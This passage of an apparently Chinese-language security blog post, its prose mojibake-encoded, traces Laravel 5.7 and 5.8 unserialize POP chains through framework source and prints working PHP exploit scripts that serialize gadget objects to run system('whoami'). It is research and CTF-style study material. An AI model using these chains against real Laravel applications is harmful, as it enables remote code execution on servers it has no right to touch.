class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Pipeline</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">handleException</span><span class="params">($passable, Exception $e)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$handler = <span class="keyword">$this</span>-&gt;container-&gt;make(ExceptionHandler::class)</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="comment">//Application</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span><span class="params">($abstract, array $parameters = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $abstract = <span class="keyword">$this</span>-&gt;getAlias($abstract);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;deferredServices[$abstract]) &amp;&amp; ! <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;instances[$abstract])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;loadDeferredProvider($abstract);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">parent</span>::make($abstract, $parameters);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Container</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span><span class="params">($abstract, array $parameters = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resolve($abstract, $parameters);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">resolve</span><span class="params">($abstract, $parameters = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $abstract = <span class="keyword">$this</span>-&gt;getAlias($abstract);</span><br><span class="line"></span><br><span class="line">    $needsContextualBuild = ! <span class="keyword">empty</span>($parameters) || ! is_null(</span><br><span class="line">        <span class="keyword">$this</span>-&gt;getContextualConcrete($abstract)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;instances[$abstract]) &amp;&amp; ! $needsContextualBuild) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;instances[$abstract];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸€è·¯è·Ÿè¿‡æ¥ä¼šå‘ç°åœ¨Applicationç±»è°ƒç”¨çˆ¶ç±»ä¹Ÿå°±æ˜¯Containerç±»çš„makeæ–¹æ³•,è¿›ä¸€æ­¥åˆ°è¾¾resolveæ–¹æ³•æ—¶ã€‚æœ‰ä¸€å¤„å¯æ§ç‚¹<code>return $this-&gt;instances[$abstract];</code></p><p>è¿˜è®°å¾—æˆ‘ä»¬æ˜¯è·Ÿè¿›<code>$this-&gt;app[Kernel::class]</code>æ¥åˆ°è¿™ä¸ªè¿”å›å€¼çš„å—?å®é™…ä¸Šæˆ‘ä»¬æœ€å¼€å§‹å¯»æ‰¾å‘½ä»¤æ‰§è¡Œæ—¶ã€‚æ˜¯ä»¥<code>$this-&gt;app[Kernel::class]=&gt;call(xxx)</code>å°è¯•è°ƒç”¨å‘½ä»¤çš„ã€‚é‚£ä¹ˆæ—¢ç„¶è¿™é‡Œappå¯¹è±¡å¯æ§äº†,æˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨ä»»æ„å¯¹è±¡çš„callæ–¹æ³•äº†ã€‚</p><p>è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬å‰é¢é€‰æ‹©Applicationç±»çš„åŸå› ã€‚å®ƒç»§æ‰¿äº†Containerç±»ã€‚æ‰€ä»¥è°ƒç”¨çš„æ˜¯Containerçš„callæ–¹æ³•ã€‚æˆ‘ä»¬è·Ÿè¿›çœ‹ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Container</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">call</span><span class="params">($callback, array $parameters = [], $defaultMethod = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> BoundMethod::call(<span class="keyword">$this</span>, $callback, $parameters, $defaultMethod);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//BoundMethod</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">call</span><span class="params">($container, $callback, array $parameters = [], $defaultMethod = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">static</span>::isCallableWithAtSign($callback) || $defaultMethod) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">static</span>::callClass($container, $callback, $parameters, $defaultMethod);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">static</span>::callBoundMethod($container, $callback, <span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($container, $callback, $parameters)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array(</span><br><span class="line">            $callback, <span class="keyword">static</span>::getMethodDependencies($container, $callback, $parameters)</span><br><span class="line">        );</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getMethodDependencies</span><span class="params">($container, $callback, array $parameters = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $dependencies = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">static</span>::getCallReflector($callback)-&gt;getParameters() <span class="keyword">as</span> $parameter) &#123;</span><br><span class="line">        <span class="keyword">static</span>::addDependencyForCallParameter($container, $parameter, $parameters, $dependencies);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> array_merge($dependencies, $parameters);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå‘ç°å®é™…è°ƒç”¨çš„æ˜¯BoundMethodçš„é—­åŒ…å‡½æ•°ã€‚å…³äºé—­åŒ…å‡½æ•°åœ¨jsä¸­æ›¾ç»å¬è¯´è¿‡ã€‚é—­åŒ…ä¸»è¦æ˜¯ä½¿ç”¨:ä¸€ä¸ªå†…éƒ¨å‡½æ•°å¯ä»¥å¼•ç”¨å¤–éƒ¨å‡½æ•°çš„å‚æ•°å’Œå˜é‡ï¼Œå‚æ•°å’Œå˜é‡å°±ä¸ä¼šè¢«æ”¶å›çš„æœºåˆ¶ã€‚</p><p>è¿™é‡Œ<code>getMethodDependencies</code>è¿”å›ä¸¤ä¸ªæ•°ç»„çš„åˆå¹¶æ•°æ®ã€‚ç„¶è€Œå…¶ä¸­<code>$dependencies</code>æ•°ç»„æ˜¯ä¸ªç©ºçš„ã€‚é‚£ä¹ˆè¿”å›çš„è¿˜æ˜¯æˆ‘ä»¬å¯æ§çš„æ•°ç»„ã€‚æ—¢ç„¶å¦‚æ­¤ã€‚è°ƒç”¨<code>call_user_func_array()</code>çš„è¿™å¥ä»£ç ä¸¤ä¸ªå‚æ•°å°±éƒ½æ˜¯å¯æ§çš„ã€‚å¯ä»¥å‘½ä»¤æ‰§è¡Œäº†ã€‚</p><p>rce exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">test</span>;</span><br><span class="line">        <span class="keyword">protected</span> $app;</span><br><span class="line">        <span class="keyword">protected</span> $command;</span><br><span class="line">        <span class="keyword">protected</span> $parameters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test, $app, $command, $parameters)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = $test;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = $app;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = $command;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($default = null)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = $default;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">instances</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($instances = [])</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;instances[<span class="string">'Illuminate\Contracts\Console\Kernel'</span>] = $instances;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">defaultgenerator</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>(<span class="title">array</span>("1" =&gt; "1"));</span><br><span class="line">    $app = <span class="keyword">new</span> Illuminate\Foundation\Application();</span><br><span class="line">    $application = <span class="keyword">new</span> Illuminate\Foundation\Application($app);</span><br><span class="line">    $pendingcommand = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, <span class="string">'system'</span>, <span class="keyword">array</span>(<span class="string">'whoami'</span>));</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($pendingcommand));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåªéœ€è¦å¢åŠ Applicationç±»çš„å†…å®¹ã€‚è®©å®ƒåœ¨ç¨‹åºæ‰¾å‘<code>$this-&gt;instances[&#39;Illuminate\Contracts\Console\Kernel&#39;]</code>æ‰¾å‘å®ƒè‡ªå·±ã€‚è¿™æ ·æˆ‘ä»¬å°±èƒ½è°ƒç”¨å®ƒçš„callæ–¹æ³•æ‰§è¡Œ<code>call_user_func_array(&#39;system&#39;,&#39;whoami&#39;)</code>äº†.</p><p>å°ç»“ä¸€ä¸‹ã€‚5.7çš„popé“¾ä»expçœ‹èµ·æ¥ä¹Ÿå°±ä¸‰ä¸ªç±»çš„äº‹ã€‚ä½†æ˜¯å…¶ä¸­è°ƒè¯•çš„åŠŸå¤«è¦æ±‚æ¯”èµ·thinkphpè¦é«˜å‡ºä¸å°‘ã€‚å…¶ä¸­éå¸¸é‡è¦çš„ä¸€ç‚¹å°±æ˜¯é€šè¿‡åŠ¨æ€è°ƒè¯•æ‰¾åˆ°<code>Kernel::class</code>çš„çœŸæ­£å­—ç¬¦ä¸²å€¼ã€‚å¹¶ä¸€è·¯æ‰¾åˆ°å¯æ§ç‚¹æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p><h2 id="laravel5-8-unserialize"><a href="#laravel5-8-unserialize" class="headerlink" title="laravel5.8-unserialize"></a>laravel5.8-unserialize</h2><p>5.8å…¶å®ä¹‹å‰åšå›½èµ›é¢˜ç›®æ—¶è·Ÿè¿‡ä¸€æ¬¡äº†ã€‚ä¸è¿‡å°è±¡ä¸å¤ªæ·±åˆ»äº†ã€‚æ‰€ä»¥å†æ¥çœ‹ä¸€æ¬¡ã€‚å…¶ä¸­æœ‰ä¸€æ¡é“¾æ˜¯é symfonyç»„ä»¶åšçš„ã€‚å°±ä¸è·Ÿäº†ã€‚(å®éªŒäº†ä¸‹æœ€æ–°ç‰ˆæœ¬symfonyç»„ä»¶æ²¡æ³•ç”¨äº†)</p><p>æˆ‘ä¸»è¦çœ‹ä¸ƒæœˆç«å¸ˆå‚…ä»‹ç»çš„ä¸€æ¡é“¾ã€‚æ¥è‡ªpç¥å°å¯†åœˆã€‚ç„¶åè¿˜æœ‰ä¸€æ¡é“¾æ˜¯æ¥è‡ªæŠ¤ç½‘æ¯çš„éé¢„æœŸã€‚è·Ÿç¬¬äº”ç©ºé—´ä¸€ä¸ªæ€§è´¨ã€‚å¦‚æœæ˜¯æŒ‰composerç›´æ¥ä¸‹è½½çš„è¯ã€‚ä¸¤æ¡é“¾éƒ½å¯ä»¥ç”¨ã€‚<br>è¿˜æ˜¯è€æ–¹æ³•æˆ‘ä»¬ç›´æ¥å¢åŠ ååºåˆ—åŒ–è·¯ç”±è·Ÿæ§åˆ¶å™¨ä»£ç ã€‚</p><p>å…¥æ‰‹ç‚¹æ˜¯ä¸€ä¸ªè²Œä¼¼åœ¨laravelå¾ˆå¤šé“¾å­ä¸­éƒ½é€šç”¨çš„destruct</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾è¿™é‡Œå°±æœ‰ä¸¤ç§æ€è·¯<br>1.å…¨å±€æ‰¾å­˜åœ¨dispatchçš„æœ‰ç”¨æ–¹æ³•ã€‚<br>2.å…¨å±€æ‰¾<code>__call</code>æ–¹æ³•</p><h3 id="popchain1"><a href="#popchain1" class="headerlink" title="popchain1"></a>popchain1</h3><p>å¯¹äºæˆ‘ä¸ªäººè€Œè¨€è¿™é‡Œå¯ä»¥è¯´æ˜¯ç¬¬ä¸€ååº”å°±æƒ³å»æ‰¾<code>__call</code>.å› ä¸ºå¾ˆæ˜æ˜¾çš„åŒå‚æ•°å‡å¯æ§.phpä¸­<code>__call</code>è¿™ç§é­”æœ¯æ–¹æ³•æœ¬æ¥å°±æ˜¯è®¾è®¡å‡ºæ¥ç”¨æ¥åŠ¨æ€è°ƒç”¨çš„ã€‚æ‰€ä»¥è‚¯å®šæœ‰ç±»ä¸­ä½¿ç”¨<code>call_user_func</code>è¿™æ ·çš„æ–¹å¼è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚æˆ‘ä»¬ä¸éš¾æ‰¾åˆ°ç¬¦åˆæ¡ä»¶çš„Generatorç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span><span class="params">($formatter, $arguments = array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;getFormatter($formatter), $arguments);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $attributes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;format($method, $attributes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span><span class="params">($formatter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;formatters[$formatter])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[$formatter];</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><p>å…¨éƒ¨å¯æ§ã€‚æ‰€ä»¥æœ€ç»ˆ<code>call_user_func</code>ç›´æ¥å‘½ä»¤æ‰§è¡Œã€‚è¿™ä¸ªçœŸçš„æ˜¯å¤ªç®€å•äº†ã€‚éš¾æ€ªç¬¬5ç©ºé—´ä¼šæ¢äº†<code>__destruct</code>.</p><p>(ä¹‹å‰å› ä¸ºç¬¬5ç©ºé—´æ‰“çš„å¤ªçƒ‚äº†æ²¡è¿›çº¿ä¸‹å°±æ²¡ä»”ç»†ç ”ç©¶ã€‚ç»“æœä»”ç»†ä¸€çœ‹å‘ç°åŸæ¥å½“æ—¶é‚£ä¸ªæ˜¯5.7çš„ç‰ˆæœ¬å•Šâ€¦â€¦)<br>è¯´èµ·æ¥æŠ¤ç½‘æ¯é‚£é¢˜destructä»£ç è°ƒç”¨çš„æ˜¯<code>$this-&gt;events-&gt;fire($this-&gt;event);</code>ã€‚è²Œä¼¼è·Ÿå®˜æ–¹æºç ä¸ä¸€æ ·ï¼Ÿä½†è¿™æ¡é“¾ååæ˜¯ä¸ªéé¢„æœŸã€‚æœ‰ç‚¹è¿·ã€‚</p><p>popchain1 exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> $event;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $event)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Generator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($format)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters = $format;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">fs</span> = <span class="title">array</span>("<span class="title">dispatch</span>"=&gt;"<span class="title">system</span>");</span><br><span class="line">    $gen = <span class="keyword">new</span> Faker\Generator($fs);</span><br><span class="line">    $pb = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($gen,<span class="string">"whoami"</span>);</span><br><span class="line">    <span class="keyword">echo</span>(urlencode(serialize($pb)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="popchain2"><a href="#popchain2" class="headerlink" title="popchain2"></a>popchain2</h3><p>æ¥è‡ªä¸Šé¢è¿™æ¡é“¾å­çš„å˜æ‹›ã€‚åˆšåˆšè¯´äº†Symphonyæœ€æ–°ç‰ˆæœ¬å·²ç»æ²¡æ³•<br>ç”¨äº†ã€‚å…¶ä¸»è¦åŸå› æ˜¯,ç¦æ­¢å¯¹TagAwareAdapterç±»ååºåˆ—åŒ–ã€‚æ‰€ä»¥åŠ äº†ä¸€ä¸ª__wakeupã€‚æ ¹æœ¬åˆ°ä¸äº†destructé‚£</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> \BadMethodCallException(<span class="string">'Cannot unserialize '</span>.<span class="keyword">__CLASS__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;commit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/08/17/Laravel-popchain/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä½†æ˜¯æœ‰Symfonyçš„æƒ…å†µä¸‹è¿˜æ˜¯å¯ä»¥ç”¨å…¶ä»–ç±»ã€‚æ¯”å¦‚æˆ‘ä»¬æœç´¢<code>__destruct</code>æ‰¾åˆ°å¾ˆæ˜æ˜¾çš„åŒå‚æ•°å¯æ§è°ƒç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImportConfigurator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Traits</span>\<span class="title">HostTrait</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Traits</span>\<span class="title">PrefixTrait</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Traits</span>\<span class="title">RouteTrait</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $parent;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(RouteCollection $parent, RouteCollection $route)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;parent = $parent;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;route = $route;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;parent-&gt;addCollection(<span class="keyword">$this</span>-&gt;route);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>destructæ˜¯ä¸€æ ·çš„å¯æ§å‚æ•°è°ƒç”¨å‡½æ•°ã€‚æ‰€ä»¥æ®Šé€”åŒå½’ã€‚<br>ä¸ä¸Šé¢ä¸€æ ·çš„çš„æ€§è´¨ã€‚expæŠŠdispatchæ”¹ä¸ºaddCollectionå°±è¡Œäº†ã€‚</p><p>exp2</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span>\<span class="title">Loader</span>\<span class="title">Configurator</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">ImportConfigurator</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">parent</span>;</span><br><span class="line">        <span class="keyword">private</span> $route;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">( $parent, $route)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = $parent;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;route = $route;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span 